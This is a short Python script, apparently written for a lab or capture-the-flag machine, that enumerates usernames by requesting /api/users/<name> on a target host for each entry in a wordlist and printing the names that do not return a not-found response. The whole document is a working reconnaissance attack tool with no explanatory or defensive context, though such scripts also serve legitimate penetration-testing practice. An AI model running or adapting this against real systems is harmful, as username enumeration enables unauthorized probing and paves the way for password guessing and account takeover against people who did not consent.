import requests
import subprocess
from tqdm import tqdm

TARGET = 'http://10.10.10.58:3000'
WORDLIST = '/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt'
WORDLIST = '/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt'
WORDLIST = '/opt/wordlists/usernames.txt'

with open(WORDLIST, 'r') as usernames:
    total = int(subprocess.getoutput('wc -l {}'.format(WORDLIST)).split(' ')[0])
    for username in tqdm(usernames, total=total, leave=False):
        r = requests.get(TARGET + '/api/users/{}'.format(username))
        if '{"not_found":true}' != r.text:
            print('[+] Possible username found: {}'.format(username))
            print('[~] Response: {}'.format(r.text))
